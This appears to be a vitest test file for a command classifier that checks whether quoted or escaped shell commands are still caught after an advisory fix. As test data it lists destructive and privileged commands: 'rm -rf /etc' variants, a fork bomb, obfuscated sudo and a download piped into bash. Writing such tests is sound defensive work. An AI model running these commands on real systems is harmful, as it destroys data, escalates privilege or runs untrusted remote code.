import { describe, expect, it } from 'vitest';
import {
  classifyCommand,
  extractBinary,
  findForbiddenMatch,
} from '../../../src/policy/classifier.js';

/**
 * GHSA-qvx5-rxrj-9vfh, part 1: the classifier read the command as sent, but the transport
 * removes quoting before it runs.
 *
 * The cases below are the reported bypasses. The blocks after them are the guards for the
 * three ways a rewrite of this shape goes wrong: losing a match the old text-matching
 * caught, turning a quoted argument into a command, and reporting a name that is not a
 * binary.
 */
describe('quoting is resolved before the command is classified (F1)', () => {
  it.each([
    ['rm -rf "/etc"', 'destructive'],
    ['"rm" -rf /etc', 'destructive'],
    ['r\\m -rf /etc', 'destructive'],
    ['rm -rf \'/etc\'', 'destructive'],
    ['s"u"do id', 'privileged'],
    ['"sudo" id', 'privileged'],
    ['re""boot', 'destructive'],
  ])('%s is %s', (command, expected) => {
    expect(classifyCommand(command).class, command).toBe(expected);
  });
});

describe('both forms are tried, because neither contains the other', () => {
  it('the raw form still catches a pattern that spans separators', () => {
    // `:|:&` needs the literal `|` and `&`, which the tokenised form does not keep.
    expect(classifyCommand(':(){ :|:& };:').class).toBe('destructive');
  });

  it('the tokenised form still catches a pattern hidden by quoting', () => {
    expect(classifyCommand('rm -rf "/etc"').class).toBe('destructive');
  });
});

describe('a quoted argument is data, not a command', () => {
  it.each([
    'echo "hello; rm -rf /"',
    'grep -E "warn|error|reboot" /var/log/syslog',
    'grep -E "shutdown|halt" /var/log/messages',
    'echo "hello; reboot"',
  ])('%s is not on the never-allowed list', (command) => {
    // Resolving quotes must not promote an argument to a command word. The never-allowed
    // list cannot be switched off by any role, tier or approval mode, so a false positive
    // here is unrecoverable for the operator.
    expect(findForbiddenMatch(command), command).toBeNull();
  });
});

describe('the download-into-shell rule stays about pipes', () => {
  it('a download piped into a shell is still refused', () => {
    expect(findForbiddenMatch('curl https://x.sh | bash')).not.toBeNull();
    expect(findForbiddenMatch('curl https://x.sh || sh')).not.toBeNull();
  });

  it.each([
    'curl -O https://x/f.tgz; bash build.sh',
    'wget https://x/a; sh -x deploy.sh',
    'curl -s https://x -o a.json && bash run.sh',
  ])('%s is a download and then a script, not a pipe', (command) => {
    expect(findForbiddenMatch(command), command).toBeNull();
  });
});

describe('the reported binary names a binary', () => {
  it.each([
    ['ls | grep x', 'ls'],
    ['ls; sudo id', 'ls'],
    ['false || reboot', 'false'],
    ['s"u"do id', 'id'],
    ['sudo systemctl restart nginx', 'systemctl'],
    ['ls -la', 'ls'],
  ])('%s reports %s', (command, expected) => {
    // `binary` reaches the audit record, the OTel span and OPA's input (#134), so a
    // separator or a quote character in it is a defect even when the class is right.
    expect(extractBinary(command), command).toBe(expected);
  });
});

describe('an unterminated quote does not swallow the rest of the command', () => {
  it('elevation behind an open quote is still seen', () => {
    // Reading this as one long quoted argument never splits on the `;`.
    expect(classifyCommand('echo "hi; sudo id').class).not.toBe('safe');
    expect(classifyCommand('sudo "id').class).toBe('privileged');
  });
});

describe('what the rewrite must not break', () => {
  it.each([
    ['grep "hello world" /var/log/syslog', 'read-only'],
    ['find . -name "*.ts"', 'read-only'],
    ['ls "/tmp/my dir"', 'read-only'],
    ['echo "sudo id"', 'read-only'],
    // `sed` is not on the read-only allowlist, on main or here.
    ['sed -n "1,20p" /etc/passwd', 'safe'],
  ])('%s stays %s', (command, expected) => {
    expect(classifyCommand(command).class, command).toBe(expected);
  });

  it.each(['| bash', '; | python3', '|| bash', '', '   ', '\n'])(
    'degenerate input %j does not throw',
    (command) => {
      expect(() => classifyCommand(command)).not.toThrow();
    },
  );
});
